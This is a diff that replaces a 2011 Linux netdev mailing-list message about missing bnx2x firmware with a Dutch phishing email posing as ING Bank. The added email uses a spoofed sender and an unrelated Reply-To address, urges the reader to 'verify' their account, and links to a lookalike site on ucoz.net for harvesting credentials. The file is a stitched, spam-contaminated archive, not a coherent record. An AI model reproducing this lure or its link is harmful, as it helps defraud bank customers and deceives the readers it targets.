@@ -1,57 +1,45 @@
-From: Eric Dumazet <eric.dumazet@gmail.com>
-Subject: Re: [PATCH net-next 0/24] bnx2x: New FW and support for 578xx
-Date: Mon, 18 Jul 2011 12:09:58 +0200
-Message-ID: <1310983798.5756.14.camel@edumazet-HP-Compaq-6005-Pro-SFF-PC>
-References: <201106141213.34576.vladz@broadcom.com>
-	 <BD3F7F1EFBA6D54DB056C4FFA451400809D2C13864@SJEXCHCCR01.corp.ad.broadcom.com>
-	 <201106141432.32257.vladz@broadcom.com>
-	 <20110614.115402.426774711287563448.davem@davemloft.net>
-	 <1310982501.5756.11.camel@edumazet-HP-Compaq-6005-Pro-SFF-PC>
-	 <1310982917.8205.1.camel@lb-tlvb-eilong.il.broadcom.com>
+From: ING Bank <cmiller@scsk12.org>
+Subject: Re: Account Verificatie
+Date: Mon, 18 Jul 2011 04:23:37 -0500 (CDT)
+Message-ID: <89b218f8-2d04-4dd9-94e1-dd3d67a902b3@zm1.scsk12.org>
+References: <0ea15310-323a-48eb-89a5-c1f565e6e4ae@zm1.scsk12.org>
+Reply-To: hkaren627@bent.cc
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: David Miller <davem@davemloft.net>,
-	Vladislav Zolotarov <vladz@broadcom.com>,
-	Michael Chan <mchan@broadcom.com>,
-	"Bhanu (Venkata Bhanu Prakash) Gollapudi" <bprakash@broadcom.com>,
-	"netdev@vger.kernel.org" <netdev@vger.kernel.org>,
-	Dmitry Kravkov <dmitry@broadcom.com>,
-	Yaniv Rosner <yaniv.rosner@broadcom.com>,
-	"dwmw2@infradead.org" <dwmw2@infradead.org>
-To: eilong@broadcom.com
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+To: ING Bank <cmiller@scsk12.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-ww0-f44.google.com ([74.125.82.44]:53868 "EHLO
-	mail-ww0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1754132Ab1GRKKI (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Mon, 18 Jul 2011 06:10:08 -0400
-Received: by wwe5 with SMTP id 5so3021531wwe.1
-        for <netdev@vger.kernel.org>; Mon, 18 Jul 2011 03:10:07 -0700 (PDT)
-In-Reply-To: <1310982917.8205.1.camel@lb-tlvb-eilong.il.broadcom.com>
+Received: from mail2.scsk12.org ([205.137.241.105]:55076 "EHLO
+	mail2.scsk12.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753309Ab1GRKm0 (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Mon, 18 Jul 2011 06:42:26 -0400
+In-Reply-To: <0ea15310-323a-48eb-89a5-c1f565e6e4ae@zm1.scsk12.org>
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Le lundi 18 juillet 2011 =C3=A0 12:55 +0300, Eilon Greenstein a =C3=A9c=
-rit :
-> On Mon, 2011-07-18 at 02:48 -0700, Eric Dumazet wrote:
 
-> >=20
-> > Hmm, I probably missed something obvious, but my dev machine (one H=
-PG6
-> > blade in a distant datacenter) fails to init its bnx2x interfaces w=
-ith
-> > current net-next-2.6
-> >=20
-> > Can't load firmware file bnx2x/bnx2x-e1h-7.0.23.0.fw
->=20
-> You are missing the FW git from
-> git://git.kernel.org/pub/scm/linux/kernel/git/dwmw2/linux-firmware.gi=
-t
->=20
-> You need to get it separately since the FW is not part of the kernel =
-git
-> now.
+----- Original Message -----
+From: ING Bank <cmiller@scsk12.org>
+To: cmiller@scsk12.org
+Sent: Mon, 18 Jul 2011 03:23:20 -0500 (CDT)
+Subject: Account Verificatie
 
-I knew it was obvious, thanks Eilon, this works better now !
+Amsterdam
 
+009785.
+
+Account Verificatie 
+
+Geachte klant,
+
+ING is niet in staat om uw account te verifieren. Uw account dient zo snel mogelijk geverifieerd te worden. 
+U kunt uw account simpel weg verifieren door op de volgende link te klikken.
+
+http://inglsecured.ucoz.net/accountindex.htm
+
+Lukt dit proces? Dan word u doorverwezen naar het Klantenservice pagina van ing.nl
+
+Hoogachtend, 
+Klantenservice,
+2011 ING Bank N.V. Nederland
 
